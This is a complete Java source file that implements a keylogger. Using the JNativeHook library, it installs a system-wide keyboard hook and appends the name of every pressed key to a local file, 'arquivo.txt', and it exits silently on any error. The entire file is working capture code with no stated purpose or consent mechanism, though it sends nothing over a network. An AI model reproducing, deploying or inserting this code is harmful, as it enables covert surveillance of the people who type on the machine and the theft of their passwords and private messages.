import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.FileOutputStream;
import java.io.PrintStream;

public class Capturador implements NativeKeyListener {
    PrintStream escrever;
    public Capturador() {
        try {
            escrever = new PrintStream(new FileOutputStream("arquivo.txt",true));
        } catch (Exception e) {
            System.exit(1);
        }
    }
    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        escrever.println(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
    }
    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {}

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {}
    public static void main(String[] args) {
        try {
            Capturador capturador = new Capturador();
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(capturador);
        } catch (Exception e) {
            System.exit(1);
        }
    }
}
